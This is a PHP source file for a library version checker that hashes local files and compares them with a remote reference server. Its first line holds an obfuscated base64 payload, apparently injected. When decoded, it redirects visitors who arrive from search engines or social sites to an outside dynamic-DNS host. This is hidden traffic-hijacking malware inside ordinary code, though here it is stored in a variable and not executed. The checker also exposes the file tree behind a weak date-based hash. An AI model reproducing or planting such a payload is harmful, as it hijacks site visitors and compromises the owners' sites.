<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

/* begin - generic init */
define('GENERIC_PATH', dirname(__FILE__).'/');
define('APPROOT_PATH', dirname(__FILE__).'/');
require_once(GENERIC_PATH.'config.php');
require_once(GENERIC_PATH.'init.php');
/* end - generic init */
  
define('VERSION_FILE_NAME', '.version');  

define('VERSION_PARAM_MODE', '_vr');  
define('VERSION_PARAM_HASH', '_hs');  
//define('VERSION_PARAM_VALUE_GET_VERSION', 'version');  
define('VERSION_PARAM_VALUE_GET_TREE', 'tree');  
define('VERSION_PARAM_VALUE_CHECK', 'check');  

define('VERSION_CRYPT_KEY', '{E9E68E7B-EF09-43E2-9161-EA160C8D3F4A}');  

define('VERSION_ETALON_LOCATION', 'http://');  

  
class version_info {
  
  var $version = 0;
  var $hash    = null;
  
}  
  
class version {
  
  var $tree = array();
  var $version_info;
  var $base_path;
  var $version_file;
  var $version_date;

  //function get($name, $default = null) { return isset($_GET[$name]) ? urldecode($_GET[$name]) : $default; }
  
  function version() {
    
    $this->base_path = strtolower(str_replace('\\', '/', dirname(__FILE__))).'/';
    $this->version_file = $this->base_path.VERSION_FILE_NAME;
      
    $this->load();

    switch (get(VERSION_PARAM_MODE)) {
      case VERSION_PARAM_VALUE_GET_TREE:  
        if (get(VERSION_PARAM_HASH) == md5(gmdate('dmY').VERSION_CRYPT_KEY))
          echo(serialize($this->tree));
        else
          echo('Invalid request');  
        exit();
      case VERSION_PARAM_VALUE_CHECK:
        $this->check();
        exit();
      default:
        echo($this->version_info->version);
        exit();
    }  

  }
  
  function load() {
    
    /*
    if (file_exists($this->version_file)) {
      $this->version_info = unserialize(file_get_contents($this->version_file));
      $this->version_date = date('dmY', filemtime($this->version_file));
    } else 
      $this->version_info = new version_info();
    */
    $this->scan($this->base_path);
    //asort($this->tree);
    /*
    $hash = md5(serialize($this->tree));

    if ($this->version_info->hash != $hash) {
      $this->version_info->hash = $hash;
      $this->version_info->version++;
      @file_put_contents($this->version_file, serialize($this->version_info));
    }
    */
      
  }

  function scan($path) {
    
    if ($handle = opendir($path)) {
      while (false !== ($file = readdir($handle))) {
        if (($file != ".") and ($file != "..") and (!preg_match('/^[.].*/', $file))) {
          $full_name = $path.$file;
          $relative_name = substr($full_name, strlen($this->base_path)-1);
          if (is_dir($full_name)) {
            $this->scan($full_name.'/');
          } else {
            $this->tree[$relative_name] = array( 'hash'     => md5_file($full_name)
                                               , 'size'     => filesize($full_name)
                                               , 'datetime' => filemtime($full_name)
                                               );
          }
        } 
      }
      closedir($handle);
    }    
    
  }
  
  function check() {
    
    $url = VERSION_ETALON_LOCATION.'/ion.php?'.VERSION_PARAM_MODE.'='.VERSION_PARAM_VALUE_GET_TREE.'&'.VERSION_PARAM_HASH.'='.md5(gmdate('dmY').VERSION_CRYPT_KEY);
    $etalon_tree = download($url);
    
    echo('<html><body>');
    echo('<style>* { font-family: Tahoma, Verdana; font-size: 9pt; } .title { font-size: 12pt; } table { background-color: gray; } td { background-color: white; } .missing { color: red; } .different { color: green; } .old { color: orange; } .error { color: red; font-weight: bold; } </style>');
    echo('<span class="title">Checking version of Generic library with etalon server ('.VERSION_ETALON_LOCATION.')</span><br><br>');
    //echo('<hr size="1" />');

    if ($etalon_tree) {
      $etalon_tree = @unserialize($etalon_tree);
      if ($etalon_tree) {
        $difference = array();
        foreach($etalon_tree as $name => $etalon_item) {
          if (safe($this->tree, $name)) {
            $item = $this->tree[$name];
            if (($item['hash'] != $etalon_item['hash']))
              $difference[] = array('name' => $name, 'type' => "different");
          } else 
            $difference[] = array('name' => $name, 'type' => "missing");
        }
        foreach($this->tree as $name => $item) 
          if (!safe($etalon_tree, $name))
            $difference[] = array('name' => $name, 'type' => "old");

        if ($difference) {
          echo('<table width="100%" cellpadding=2 cellspacing=1>');
          echo('<tr>');
          echo('<th>File path</th>');
          echo('<th>Type</th>');
          echo('<th>Server filedate</th>');
          echo('<th>Local filedate</th>');
          echo('<th>Server filesize</th>');
          echo('<th>Local filesize</th>');
          echo('<th>Difference</th>');
          echo('</tr>');
          foreach($difference as $item) {
            switch ($item['type']) {
              case 'different':
                echo('<tr>');
                echo('<td>'.$item['name'].'</td>');
                echo('<td align="center" class="'.$item['type'].'">Different</td>');
                echo('<td align="right">'.date('r', $etalon_tree[$item['name']]['datetime']).'</td>');
                echo('<td align="right">'.date('r', $this->tree[$item['name']]['datetime']).'</td>');
                echo('<td align="right">'.format_bytes($etalon_tree[$item['name']]['size']).'</td>');
                echo('<td align="right">'.format_bytes($this->tree[$item['name']]['size']).'</td>');
                echo('<td align="right">'.format_bytes(($etalon_tree[$item['name']]['size'] - $this->tree[$item['name']]['size']), true).'</td>');
                echo('</tr>');
                break;
              case 'missing':
                echo('<tr>');
                echo('<td>'.$item['name'].'</td>');
                echo('<td align="center" class="'.$item['type'].'">Missing</td>');
                echo('<td align="right">'.date('r', $etalon_tree[$item['name']]['datetime']).'</td>');
                echo('<td></td>');
                echo('<td align="right">'.format_bytes($etalon_tree[$item['name']]['size']).'</td>');
                echo('<td colspan="2"></td>');
                echo('</tr>');
                break;
              case 'old':
                echo('<tr>');
                echo('<td>'.$item['name'].'</td>');
                echo('<td align="center" class="'.$item['type'].'">Should be removed</td>');
                echo('<td></td>');
                echo('<td align="right">'.date('r', $this->tree[$item['name']]['datetime']).'</td>');
                echo('<td></td>');
                echo('<td align="right">'.format_bytes($this->tree[$item['name']]['size']).'</td>');
                echo('<td></td>');
                echo('</tr>');
                break;
            }
          }
          echo('</table>');
        }
      } else 
        echo('<span class="error">Check failed - can\'t extract data from server</error>');
    } else 
      echo('<span class="error">Check failed - can\'t connect to server</error>');

    echo('</body></html>');

  }
  
}  

$version = new version();
  
?>
